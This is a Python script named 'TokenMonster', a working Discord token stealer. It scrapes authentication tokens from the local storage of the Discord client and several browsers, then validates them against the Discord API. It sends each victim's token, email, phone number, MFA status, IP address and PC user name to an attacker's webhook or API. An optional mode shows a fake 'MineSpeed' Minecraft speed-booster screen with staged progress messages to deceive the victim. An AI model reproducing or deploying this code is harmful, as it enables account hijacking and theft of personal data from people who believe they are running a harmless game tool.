import os
import re
import json
import requests
import colorama
from time import sleep
from alive_progress import alive_bar

if 'PYCHARM_HOSTED' in os.environ:
    convert = False
    strip = False
else:
    convert = None
    strip = None

colorama.init(
    convert=convert,
    strip=strip
)

config = {
    'WEBHOOK': True,
    'WEBHOOK_URL': "<YOUR DISCORD WEBHOOK URL>",
    'GUI': False,
    'API_SEND': False,
    'API_SEND_URL': "<YOUR_API_URL>"
}


class TokenMonster:
    _pc_user = os.getlogin();
    _pc_roaming = None
    _pc_local = None
    _tokens = []

    def __init__(self):
        if os.name != 'nt':
            exit()

        self._pc_roaming = os.getenv('APPDATA')
        self._pc_local = os.getenv('LOCALAPPDATA')

        self._scrape_tokens()

        for token in self._tokens:
            raw_user_data = self._retrieve(token)
            user_json_str = json.dumps(raw_user_data)
            user = json.loads(user_json_str)
            if "username" in user:

                if config["WEBHOOK"]:
                    webhook_data = {"username": "TokenMonster", "embeds": [
                        dict(title="Grabbed " + user['username'] + "'s token",
                             description="Token Monster has sniped an account at " + self._network_address() + " on " + self._pc_user,
                             color="4063108",
                             fields=[
                                 {
                                     "name": "💳 ID",
                                     "value": "`" + user["id"] + "`",
                                     "inline": False,
                                 },
                                 {
                                     "name": "🧔 Username",
                                     "value": "`" + user["username"] + "`",
                                     "inline": False,
                                 },
                                 {
                                     "name": "🎫 Tag",
                                     "value": "`" + user["discriminator"] + "`",
                                     "inline": False,
                                 },
                                 {
                                     "name": "🏁 Locale",
                                     "value": "`" + user["locale"] + "`",
                                     "inline": False,
                                 },
                                 {
                                     "name": "🔐 MFA Enabled?",
                                     "value": "`" + str(user["mfa_enabled"]) + "`",
                                     "inline": False,
                                 },
                                 {
                                     "name": "📬 Email",
                                     "value": "`" + user["email"] + "`",
                                     "inline": False,
                                 },
                                 {
                                     "name": "☎️ Phone Number",
                                     "value": "`" + str(user["phone"]) + "`",
                                     "inline": False,
                                 },
                                 {
                                     "name": "💰 Token",
                                     "value": "`" + token + "`",
                                     "inline": False,
                                 }
                             ])
                    ]}

                    result = requests.post(config["WEBHOOK_URL"], json=webhook_data)

                if config["API_SEND_URL"]:
                    payload = {
                        'user_id': user["id"],
                        'username': user["username"],
                        'tag': user["discriminator"],
                        'locale': user["locale"],
                        'mfa': str(user["mfa_enabled"]),
                        'email': user["email"],
                        'phone': str(user["phone"]),
                        'token': user["token"]
                    }

                    requests.post(config["API_SEND_URL"], data=payload)

        self._tokens.remove(token)

        if config["GUI"]:
            self._display_fake_prompt()

    def _scrape_tokens(self):

        crawl = {
            'Discord': self._pc_roaming + '\\discord\\Local Storage\\leveldb\\',
            'Chrome': self._pc_local + '\\google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self._pc_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self._pc_local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Opera': self._pc_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\'
        }

        for source, path in crawl.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            self._tokens.append(token)

    def _retrieve(self, token, content_type="application/json"):

        header_data = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
            "Authorization": token
        }

        return requests.get('https://discordapp.com/api/v9/users/@me', headers=header_data).json()

    def _network_address(self):
        ip = requests.get('https://api.ipify.org?format=json').json()
        if ip:
            ip_raw = json.dumps(ip)
            user_ip = json.loads(ip_raw)
            return user_ip["ip"]
        else:
            return False

    def _display_fake_prompt(self):
        display_string = """
---------------------------------------------------------------

███╗   ███╗██╗███╗   ██╗███████╗███████╗██████╗ ███████╗███████╗██████╗ 
████╗ ████║██║████╗  ██║██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
██╔████╔██║██║██╔██╗ ██║█████╗  ███████╗██████╔╝█████╗  █████╗  ██║  ██║
██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ╚════██║██╔═══╝ ██╔══╝  ██╔══╝  ██║  ██║
██║ ╚═╝ ██║██║██║ ╚████║███████╗███████║██║     ███████╗███████╗██████╔╝
╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝     ╚══════╝╚══════╝╚═════╝ 

----------------------------------------------------------------
@Package: MineSpeed
@Version: 1.0.1
@Description: Improve your Minecraft client speed. :D
---------------------------------------------------------------- 
        """

        print(colorama.Fore.LIGHTGREEN_EX + display_string)

        if self.has_internet():
            print(colorama.Fore.WHITE + "Download latest injection package...")
            sleep(2)
            print(colorama.Fore.GREEN + "Locating Minecraft Client runtime...")
            sleep(3)
            print(colorama.Fore.BLUE + "Injecting package, this may take a while...")
            sleep(6)
            print(colorama.Fore.GREEN + "Re-Compiling  Client runtime...")
            sleep(3)
            print(colorama.Fore.CYAN + "Testing package and cleaning things up...")
            with alive_bar(100) as bar:
                for i in range(100):
                    sleep(0.08)
                    bar()
            os.system('cls' if os.name == 'nt' else 'clear')
            print(
                colorama.Fore.WHITE + "All done! Your Minecraft game should run at least 2x faster than normal. If you didn't notice any improvements, let us know!")
            print(colorama.Fore.MAGENTA + "Thank you for using this tool! :))")
            os.system("pause")
        else:
            print(colorama.Fore.RED + 'You are offline, restart MineSpeed by pressing any key, and reconnect to '
                                      'the internet.\n')
            os.system("pause")

    def has_internet(self):
        try:
            response = requests.get('https://www.google.com/')
            return True
        except:
            return False


init = TokenMonster()
